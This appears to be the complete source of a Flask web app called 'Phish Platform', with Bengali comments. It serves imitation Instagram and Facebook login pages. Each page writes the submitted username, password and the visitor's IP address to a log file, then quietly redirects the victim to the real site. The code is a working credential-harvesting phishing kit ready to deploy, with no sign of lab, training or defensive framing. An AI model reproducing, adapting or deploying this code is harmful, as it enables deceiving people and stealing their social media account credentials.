import os
from flask import Flask, render_template_string, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'test-key-123'

# ---------- HTML টেমপ্লেট (সরাসরি স্ট্রিং হিসেবে) ----------
HOME_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Dashboard</title></head>
<body>
<h2>Welcome to Phish Platform</h2>
<p>Your app is running correctly!</p>
<ul>
    <li><a href="/test">Test Page</a></li>
    <li><a href="/instagram">Instagram Template</a></li>
    <li><a href="/facebook">Facebook Template</a></li>
</ul>
</body>
</html>
"""

TEST_PAGE = "<h1>Test Page Working!</h1><a href='/'>Go Back</a>"

INSTA_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Instagram Login</title></head>
<body style="background:#fafafa;">
<div style="width:300px; margin:100px auto; background:white; padding:30px;">
    <h2>Instagram</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Username" style="width:100%; margin:10px 0;" required><br>
        <input type="password" name="password" placeholder="Password" style="width:100%; margin:10px 0;" required><br>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>
"""

FB_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body style="background:#e9ebee;">
<div style="width:350px; margin:150px auto; background:white; padding:30px;">
    <h2>Facebook</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Email or Phone" style="width:100%; margin:10px 0;" required><br>
        <input type="password" name="password" placeholder="Password" style="width:100%; margin:10px 0;" required><br>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>
"""

# ---------- রাউট ----------
@app.route('/')
def home():
    return HOME_PAGE

@app.route('/test')
def test():
    return TEST_PAGE

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # লগ ফাইলে সংরক্ষণ
        with open('phish_logs.txt', 'a') as f:
            f.write(f"Instagram | {username} : {password} | IP: {request.remote_addr}\n")
        return "<h2>Redirecting to Instagram...</h2><script>setTimeout(()=>{location.href='https://instagram.com'},2000);</script>"
    return INSTA_PAGE

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('phish_logs.txt', 'a') as f:
            f.write(f"Facebook | {username} : {password} | IP: {request.remote_addr}\n")
        return "<h2>Redirecting to Facebook...</h2><script>setTimeout(()=>{location.href='https://facebook.com'},2000);</script>"
    return FB_PAGE

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)